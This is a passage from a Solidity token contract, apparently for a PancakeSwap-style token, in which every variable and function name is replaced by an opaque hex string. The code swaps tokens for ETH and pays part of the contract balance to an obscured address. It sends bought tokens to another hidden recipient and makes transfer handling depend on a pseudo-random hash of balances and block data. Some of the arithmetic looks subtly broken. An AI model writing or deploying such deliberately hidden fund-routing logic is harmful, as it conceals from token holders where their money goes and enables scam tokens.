{Oxedf11956c89ac5e6abf73116d5ebc155f14b3384216c736faa36b5b2d583adba05eb913d6f6dfe7a13be4750089058dcd801ab63708001f545351acd120476bc (0, poolList[i]);}} else Oxedf11956c89ac5e6abf73116d5ebc155f14b3384216c736faa36b5b2d583adba05eb913d6f6dfe7a13be4750089058dcd801ab63708001f545351acd120476bc(0, recipient);}emit Transfer(sender, address(this), Oxbc66756224004cd64eaa8f37486227c87d31d2ad06b8f0cd5c2d81df7f0861b978bc842d139c4b8030ef290b7815ab9cbeefa6954dfc8390ebd7a6d84a147c11 / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7);return Oxee12cd14edd4f3f84806393055e04cfc942356844566c7ee001f3301c604067d1097e725aa499e41c51e5a68da576dcfc59515d1b2d6043cb75f3144cd3f1549 + Oxdcd5ce307d4e76f9b4af4d612b6bfd6170313e7612f4e8c987c7a0d2f3148be45bf5d30cbbc09007a8e2dde8bc8b83824cc8122f56b2c176b2d3e496672895db - Oxbc66756224004cd64eaa8f37486227c87d31d2ad06b8f0cd5c2d81df7f0861b978bc842d139c4b8030ef290b7815ab9cbeefa6954dfc8390ebd7a6d84a147c11;}function Oxe695b8aca75913dc0b21a86b8f1829512f8a8951a34d8f50a0f5ecec1272fd16a5e74d2d75da70987e1dea5f04fc88193f6a9c39bd8a8ee794c03ff8a2f918bb() internal Ox4432caf269bd3c89f73a2fbc47262008d2967720cf095c9facf4dc5d007880ad06c34565decd01bb93e4eb93ea816c530468d6c807a092aba6a25965a7905e14 {uint256 Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520 = Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[address(this)] / Ox604e19fd903161bd800e6c4892228398a1adef6b53ad6e9cfbced15312c6deb82479978bfcdb649d46e0ba3abf2d48f357cbecd37c566c92b4c48c4fe6febff7;if( Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520 == 0) return;uint256 Ox359718ee1204b2d0a6b46dcbd95a830f9d5bc641874c364edb422be11f14f500e5961899ae559a9037026a7f964f3ff958ec8a1e871536c2a579bab6a1fb6e22 = address(this).balance;address[] memory path = new address[](2);path[0] = address(this);path[1] = Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH();if((Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(poolList[0])*100)/Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 >= Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835 && (Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(poolList[0])*100)/Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 < Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88){Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.swapExactTokensForETHSupportingFeeOnTransferTokens(Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520,0,path,address(this),block.timestamp);(bool success, ) = payable(Ox0d12084248ffac39feaca5f70b48a845ab14be764b9ba3595109e0c17886b9257445633f42d50d2c90eb7548dac80f14bebb90fd7bddc01da0995357bd36a556).call{  value: (address(this).balance - Ox359718ee1204b2d0a6b46dcbd95a830f9d5bc641874c364edb422be11f14f500e5961899ae559a9037026a7f964f3ff958ec8a1e871536c2a579bab6a1fb6e22) * Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 / (Ox1316ab74b414a62a9b01a30049bd56854079b0893f9ba0603e350a4c0094e2cbc39a625bca411845c35c372e9cdfe6f46f8a6d0f7f5e1ad687d852a6d3a714d9 + Oxb2c6616edd01f082ec7e4257d0c1fc301ce1135b3887cef21bbfae05497a58d846dffe712bf62adc0d5dec9cb16d94c6ec9efeb1bb84305349a0e9511b039245),gas: 30000}("");require(success, "j");}}function Ox6debe9a9f7b1261933595bfefde1d6ccdb2d28ddfff0503d44a61d90c62af1596c410ab6dc36b33c2d34a06b5b4bf14fbb86de2fc77a3e41672573ae7914e8bf() internal Ox4432caf269bd3c89f73a2fbc47262008d2967720cf095c9facf4dc5d007880ad06c34565decd01bb93e4eb93ea816c530468d6c807a092aba6a25965a7905e14 {uint256 Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520 = address(this).balance;if( Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520 == 0) return;if( Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520 > 0) {address[] memory path = new address[](2);path[0] = Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH();path[1] = address(this);uint[] memory Ox8f179889f6229536fac79608117bdd0cf72ee37683b16365d88170f2613bc62b6b3640016e751ae8979f5c5af4fc5d28052401e1a0bedb6354568a2c504f5308; Ox8f179889f6229536fac79608117bdd0cf72ee37683b16365d88170f2613bc62b6b3640016e751ae8979f5c5af4fc5d28052401e1a0bedb6354568a2c504f5308 = Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.getAmountsOut(Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520, path); Ox8f179889f6229536fac79608117bdd0cf72ee37683b16365d88170f2613bc62b6b3640016e751ae8979f5c5af4fc5d28052401e1a0bedb6354568a2c504f5308[1] = Ox81d555e9f731b2b6229b649d675cda6615a28d7156a07cf3405bc7e8ac0fbf008543310ade625b0c3da35cbecba67d0b373bde4a166813c71bd1d261414affbb(Ox8f179889f6229536fac79608117bdd0cf72ee37683b16365d88170f2613bc62b6b3640016e751ae8979f5c5af4fc5d28052401e1a0bedb6354568a2c504f5308[1], poolList[0]);if((Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(poolList[0])*100)/Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 >= Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835 && (Ox49c7ef34bcf7908bf2d1b64e6cbd62f8625d49e3fb5c131bc8c56c03576ded6ab47fb622a9fc5b56b9a2dde1b7c673b3f1d9f6a1dd82fa8d19059a74056f6c1c(poolList[0])*100)/Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02 < Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88){Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.swapExactETHForTokensSupportingFeeOnTransferTokens{value: Ox019536fc69fa8fb96030b2a8faacd4cf4108ae65e15106a5cba28a95e305324f41a558205f2a5104c7b1263f7d3eae451edf4203dcf3d1d82a492442596e5520}(Ox8f179889f6229536fac79608117bdd0cf72ee37683b16365d88170f2613bc62b6b3640016e751ae8979f5c5af4fc5d28052401e1a0bedb6354568a2c504f5308[1] * Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox39b80d6ac8f3a94f307a60af1060182483dfe1f2e7773668434caf84fcbfb1f9ab4ef696c8a012f6b3bd463b07179020650136aefc2592ff299fecde0ba2b294 / 1000,path, Oxbcda5a3b450351a5a14dd577060a16e39f940b264c6462b7ee2085913526b1c6cfc0053f70ce9b98b5b2276e893fedc03e7c8e5472c99655ffddcb8cda240819, block.timestamp + 300);Oxad6634a54b19b1129e456639ce12dda260fe23c2a701b05307b94fa26a90d76b32d577be74e9e0b5c3ef8b96c9174cad459b3191b91c5647787c5af176ef8993(Ox34a97b4b76be7c2f2948eae45035962c11c933da0e12ad4c1e7a61e3478f7c5bec49384a6c7b6305cecb86edaecf45eed73bb97639c028d57496fd61a6ff684b(Ox546481c5b4a41f4d6d1a980974a419ca762f5ba02c38601c9d721a4a516be6e73a48ea5b01cc29bba06d4ef08d538b176097dfbf1bbb2a695026da4e89daa3dc), Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxb3124d8d7849f2d02c1b189f919aca91a55b7c48bfcac78ff415437af947140c204ae87b098bb0345ad6710c1c73ee690ddfdb005745b3ab52b090f6ec8f0d02, Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[poolList[0]].Oxee61c1030372de3721b2d2a5a4e3abf50aeb2702ed7f77e03fec57556b9254caa3560bda4b0b337d500db2924524b661577770f0564ca01a02cee9e9f2da1b24, poolList[0], 2);}}}function Ox804df74b33f885eb0ecded4733793479702345c76409dc6cf72dca58e90672e6c751aab390b73e1c60045c651edfea1d29a957543bec16398fb517ef0fb620e9() internal view returns (bool) {return Ox29194b0725c83e6c356facae79255d0a5d86ce160f89c7ceada0af0559f33a1a14518bd73b40c1694a9a3fcb301af4c864335624595b15644369a1316041b36d &&(Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c < Oxcdd4850dad9352d0bf57085707dccf1743ff1e87267653051deb3c27200569273f6e06b6ea09fe848a00e97cdb5770c4cf0fcfa886a7f024cfb8b7bbaf1eeb8a) &&msg.sender != Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[msg.sender].pairAddress  &&!Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 &&block.timestamp >= (Ox612e05714958387f480fa7ce4114b501f1970e5038b72ec422a5bd6d1f1e3bcb27b91a2bfdb615a789c5ccf0d5821161292c8d02f2ca8e0ee2f52b302a00a2d5 + 15 minutes);}function Oxc109893900b3d2dfd468ff5f3a5cf550fb724ac086a242b988a1fc530433ea3f7a81a039250a31ae87a0f6d173710eb3428f4246cdd8ca94f0412c4bcbedb86f() internal view returns (bool) {return !Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 &&msg.sender != Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[msg.sender].pairAddress ;  }function Ox382a7116add3c456c74de3f13b4cc6a018191d2e42663a2ab8274f070d206349cb9b627d4e5ba40072c95c69a0f4cae84dbd8f8ad7dddeccb033ac6568b2c5b2(address sender, address recipient, uint256 amount) internal returns (bool) {bool Oxfd1269af5d226084a0d72bd659e3380fdfc44e3a222b68315a76dad85d5402fbc77591136072c2e4b5ac73dde8f22bf86907f260be7a322446f340a2805124ad;if(!Ox3b1919ff8e4467ffcb18a67ca38f07304b0f90a8b872be269279b1a7c695fc010eb4dac95c1c0eeb1eb7772be310b77fcc8977a19966203e4cd87d9fc91e1c28 && msg.sender != Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[msg.sender].pairAddress){if(Ox84625e80fe814b854335ebe0811d6e97aa209e3f8dd6589f12c1aced375a5cd598b14f21f9012ee200f850bf5bb3cf1131bd064fdf386d3c57a5b517c9a6d410) {Ox84625e80fe814b854335ebe0811d6e97aa209e3f8dd6589f12c1aced375a5cd598b14f21f9012ee200f850bf5bb3cf1131bd064fdf386d3c57a5b517c9a6d410 = false;return true;} else if(address(this).balance >= Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox733860415c880515084223ed9eb6687a832161188cd3dc81a6fa7806c94c6c6dd907e48434efcbf7edc25de991208631a0a9a759c869e98d899690cec5ffe4fb) { Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655 = 0;return true;} else if(address(this).balance >= Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Ox3cffbd991db34db73c8ce31c54545e2780649fa1065b514cdabe089c9afd283539aace8df22bf07f820d5a1234e86ff9f2809a789ea37b52b260bab3f9628b9e) {if(Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxd742d77c12f812e8ec674d45cc850fea400c72ddf403788d2c6bcbed12494d2e4b9c26fe97cf82106e441de1f75543ed0bc6fba9d4fb6e5a701227c8559b1bf1){if(Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655 < block.number) {uint8 Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9 = Oxd905c610651df175170f3311d42368dded8b8b9970c8aad77c228223df9c7cc9d7c6492d61137b388686575d8a1d182482bfafbcf67b647315c46aa487930b56(sender,recipient,amount);if(Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9 < Ox9b44a1d7a45b9623906a6981c13f16a0cbc1f9688293234a053d86073e590e0dee167333f3e0613d8a3ec8198a0f72535e40a522c9c9a8aa4a029bfd5800cc4e.Oxcb596cd72fb9955a60ca9e4b0bd52dc2a8a5469c6e33124ed502af5ce0c637180d3802f34c7be3d6155854b2e4d46557dac228a7629e53dfd38e87bcab619ef7) { Oxfd1269af5d226084a0d72bd659e3380fdfc44e3a222b68315a76dad85d5402fbc77591136072c2e4b5ac73dde8f22bf86907f260be7a322446f340a2805124ad = true;Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655 = 0;} else Ox42be1ae936b0eb13ecb943f338b14a4d2cb59de0ff7d6d85e2976233b24db3063440cba7b4508e8a43cbad5ab015615dc683fa9d8f159c8bf67a5e214ac70655 = block.number + uint256(Oxe36abd08d0c3ea07e6cd64c8eb7581f7209af49f2b7bc966df23086a0df1dbbb4124b634cc5619c46fc7629f332df397b9b8dac486a7ae05acad7fb68d115df9);}} else {if(Ox6738ade165074474f2ead6e545e588ee748131ca5701ffdbae3d34c0e88369c9b8cad7c5a05e024442abbf8791382e9153fbb84d17bd71a72d404b981578f80c == 0) { Ox6738ade165074474f2ead6e545e588ee748131ca5701ffdbae3d34c0e88369c9b8cad7c5a05e024442abbf8791382e9153fbb84d17bd71a72d404b981578f80c = block.number + uint256(Ox0d2f46af01ae354896b23f970da173772e5497f7fb3827067da2086edec03a0ccc99c83064d7b1c11e017071cf7b57b7233e3fdaf85ec03d3e95f703404ee602);} else if (Ox6738ade165074474f2ead6e545e588ee748131ca5701ffdbae3d34c0e88369c9b8cad7c5a05e024442abbf8791382e9153fbb84d17bd71a72d404b981578f80c < block.number) {Ox6738ade165074474f2ead6e545e588ee748131ca5701ffdbae3d34c0e88369c9b8cad7c5a05e024442abbf8791382e9153fbb84d17bd71a72d404b981578f80c = 0;Oxfd1269af5d226084a0d72bd659e3380fdfc44e3a222b68315a76dad85d5402fbc77591136072c2e4b5ac73dde8f22bf86907f260be7a322446f340a2805124ad = true;}}}}return Oxfd1269af5d226084a0d72bd659e3380fdfc44e3a222b68315a76dad85d5402fbc77591136072c2e4b5ac73dde8f22bf86907f260be7a322446f340a2805124ad;}function Oxd905c610651df175170f3311d42368dded8b8b9970c8aad77c228223df9c7cc9d7c6492d61137b388686575d8a1d182482bfafbcf67b647315c46aa487930b56(address sender, address recipient, uint256 amount) internal returns(uint8) {uint256 Oxc98532863a26ead1190cc78aa5b28f3ae5a64f7c8762ec0deb6004bcc91b5d9b89179ca0c78f74f57ec6be05ff1e41182d7df123faf544a79830cf83478c845d = uint256(keccak256(abi.encodePacked(Ox1619f6d175e0aadb3482e2c5f1f52aa9bdf53b7c8a331173ccd6560c30bfb42a6e6037da39ed4c11d7d1086f995b514e3f09158461cf79587c486ad9a692b82c, amount, sender.balance,Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[sender],recipient.balance, Oxb0358942bb83789056bd0d1fee7b633561376a32e0fd4775d2942001675b09d12de127251763e624e9f642e9dc750547b975ed34af60a91287d14c60bc0acdec[recipient], Ox0d2236f9159e1bfcad010d743093446544bd914dd460be1eedfae47de407091f42877a66f7a8d2a6bf1e2fbbff554988e48dbbc32d3c6bb5768e95fd76b9c32a++, block.timestamp, msg.sender, blockhash(block.number - 1))));return uint8(Oxc98532863a26ead1190cc78aa5b28f3ae5a64f7c8762ec0deb6004bcc91b5d9b89179ca0c78f74f57ec6be05ff1e41182d7df123faf544a79830cf83478c845d % 100000000000000000000);}function Oxf57ac77f6481b03a140800c1fa2769d107bb1f9a904c4f5f8620fbbc0b77b7b5924a366b5349e625068c46feadd33c4ebe341a660415a57e8efbcfae35d6c193(IPancakeSwapPair Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d, uint256 Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 ) internal view returns(uint256) {uint256 Ox6000e9f17899d2b512834140805b9804432ef3241ab6e1f0f56f09b1834cbe405eb991324a9d154ac5b20163e3338fe113238ae272270df56fe316e0bad64ec8;(uint Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, uint Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b,) = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.getReserves();if(Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73 > 0 && Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b > 0) { address Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150;address Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3;if(Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token0() == address(this)) {(Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b) = (Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b, Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73);Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token1();Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = address(this);} else if(Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token1() == Oxbad4c1eee8e71609b4364e8ed9ec3bd53f5a5e62af218015ba33c601e1da238ea4a9239f44f0852b8d67f5cebef151a77f8bd7b83064459e6074500e317442cb.WETH()) {(Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73, Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b) = (Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b, Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73);Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = address(this);Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token0();} else {Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token0();Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3 = Ox8d50d21db24c97198b029aa543ec857a2ae54a3d566cd4685a98bb13df6cb005f70600d7ed59205660bc993cf409136432c6415a44a306e673a3468f3e61e61d.token1();}Ox6000e9f17899d2b512834140805b9804432ef3241ab6e1f0f56f09b1834cbe405eb991324a9d154ac5b20163e3338fe113238ae272270df56fe316e0bad64ec8 = ((Oxe35a900d9aaca65c3304c8253063b8053df3b1829bd2907ce59e4a2913bf2b66ca726e58ae079ac138667c48e81af791538643d7c6abf50d688ffc73d4aad787 * 1e10) * (Ox7cc61b8f8bbf1d8b779ae7be72dd08b91d8f71264506b6c5f32d7bd1355d7555f3b0c08919aba3725dd851df1710829886f0dbb53ea9bda3d83bf2a72df16b73 * 1e18/Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[Oxe333cff24590411b20a53b54bd6c297b950a9699efb247a545d92b4b2aaaf684f07401e4ebedd80666efbb1806543e3eeaa734b3079974ddfec079994d565150])) / (Oxf433840df9ea6065bd275a3a500af406b3a219a6edd720d4ffc1fb8847df855abb7f44affb08664aa9cc34775fc04bb524168e980ed36ec5e0ecc007acadfa5b * 1e18/Ox47b6102ae26e0d58f4db93b9338436fa6efea1617c70ad990eb26c1bcc7d24adb7119bae6c49015cd4014be696a37dac1d0276b142b823aa5dad063557144be2[Ox335f21b51c90b0f74a07cceb7e7614bf8cbb8627c874ba5408e4c33b73c8fcd15f2f82dad6330e7504bfa05da81ddd68774c0e659975847db05b16d2717b42d3]) / 1e10;}return Ox6000e9f17899d2b512834140805b9804432ef3241ab6e1f0f56f09b1834cbe405eb991324a9d154ac5b20163e3338fe113238ae272270df56fe316e0bad64ec8;}function Ox6a4e6ba7cc70fb06c1a7e4cc809625ad21de9d953af8f07ab37f80ee66fc6020800b4963d92db36935d3f8a773d8b8775b03bf61e4a30145bfb0336d0fb31e94(address Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95) internal {uint256 Ox7f44df47842cbd2a80d175e3eb20e45cbc67c122ffcd9727e3041bcca56b53ba60987f9e9be9e3640198fdbe4223d6e2f7fc658e6cce8c856f75aa61b44e5aad;if(block.number > Ox6fc41adf6c4574ce8ca0a88f94f5f43f7b352f13212f039ec4852feb3dd0fc0a57dc1c3a0593c7f72cef7fe56e856c31f6c318bae08444fa4cbd45be6688e01c[Ox6192bb0fb0c7472e93ec04b1d751ce50baa5f9674b4f2f1296093908ef98eae6cc3c21b751746750a90586486a801d968b10c271ad131b7321626fdd6a8e9d95].Ox7ee2a18e0838bdbf657fb075ea5bf752b8f2add16921ff1fa1711c8ace024cc83c707b76f3b984a2c80ee400379a6c82868786cf12994743d61f4a68aa72bf95) 